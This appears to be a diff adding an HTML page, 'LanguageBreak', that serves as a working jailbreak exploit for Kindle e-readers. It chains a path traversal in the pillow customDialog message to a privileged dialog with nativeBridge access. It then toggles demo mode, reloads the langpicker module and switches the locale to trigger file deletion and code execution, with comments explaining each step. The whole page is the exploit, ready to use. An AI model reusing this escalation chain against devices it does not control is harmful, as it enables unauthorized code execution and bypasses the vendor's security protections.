@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta name="viewport" content="user-scalable=no" />
+        <title>LanguageBreak</title>
+        <script>
+            var kindle = window.kindle || top.kindle;
+            if (kindle) {
+                const chromeConfig = {
+                    appId: 'com.lab126.store',
+                    topNavBar: {
+                        template: 'title',
+                        title: document.title
+                    }
+                };
+                kindle.messaging.sendMessage('com.lab126.chromebar', 'configureChrome', chromeConfig);
+            }
+            function jailbreak() {
+                document.getElementById("log").innerHTML += "<br>Entering demo mode."
+                /// Enter demo mode
+                nativeBridge.createDemoModeFlagFile();
+                nativeBridge.sendLipcEvent("com.lab126.pillow","enterDemoMode", "");
+                /// Wait a bit so we are sure the flag file is created (the actual lang_picker.js file states that this can take upto 1000ms)
+                setTimeout(function() {
+                    document.getElementById("log").innerHTML += "<br>Reloading langpicker module."
+                    /// Reload langpicker pillow module so it knows that we are in demo mode
+                    nativeBridge.setLipcProperty("com.lab126.blanket","unload", "langpicker");
+                    nativeBridge.setLipcProperty("com.lab126.blanket","load", "langpicker");
+                    /// Wait a bit so we are sure it's reloaded
+                    setTimeout(function() {  
+                        document.getElementById("log").innerHTML += "<br>Exiting demo mode."
+                        /// Exit demo mode -- langpicker already thinks its in demo -- it only checks on load
+                        nativeBridge.deleteDemoModeFlagFile();
+                        nativeBridge.sendLipcEvent("com.lab126.pillow","exitDemoMode", "");
+                        document.getElementById("log").innerHTML += "<br>Changing language to Chinese."
+                        /// Change locale to chinese -- this triggers the actual deletion and thus code execution -- make sure we have an exploit file and a wait file in /mnt/us/documents/dictionaries
+                        nativeBridge.sendLipcEvent("com.lab126.pillow", "changeLocale", "zh-Hans-CN");
+                        /// Change locale back to english -- idk about you but i don't speak chinee -- we can do this because we had a wait file in /mnt/us/documents/dictionaries
+                        // nativeBridge.sendLipcEvent("com.lab126.pillow", "changeLocale", "en-US");
+                        // we do this inside the jailbreak shell script :)
+                    }, 3000);
+                }, 1000);
+            }
+
+            function elevate() {
+                /// A bug in pillow allows us to open a dialog with specified html file anywhere on the filesystem -- dialogs have access to the nativeBridge -- which in turn has access to the whole of LIPC
+                kindle.messaging.sendMessage(
+                    "com.lab126.pillow",
+                    "customDialog",
+                    { name: "../../../../../../../../mnt/us/jb" }
+                );
+            }
+        </script>
+    </head>
+    <body>
+		<button onclick="elevate()" id="elevate">Jailbreak</button>
+        <button class="elevated" onclick="nativeBridge.dismissMe()">
+            Hide me
+        </button>
+        <div id="log">
+
+        </div>
+        <script>
+            var style = document.createElement("style");
+            style.innerHTML = "";
+            if (window.nativeBridge) {
+                /// If we are elavated we will have access to nativeBridge thus we can procceed to run our exploit
+                nativeBridge.showMe();
+                document.getElementById("log").innerHTML = "Elevated. Running jailbreak."
+                jailbreak();
+                style.innerHTML += "#elevate { display: none; }\n";
+            } else {
+                style.innerHTML += ".elevated { display: none; }\n";
+            }
+            document.head.appendChild(style);
+        </script>
+    </body>
+</html>
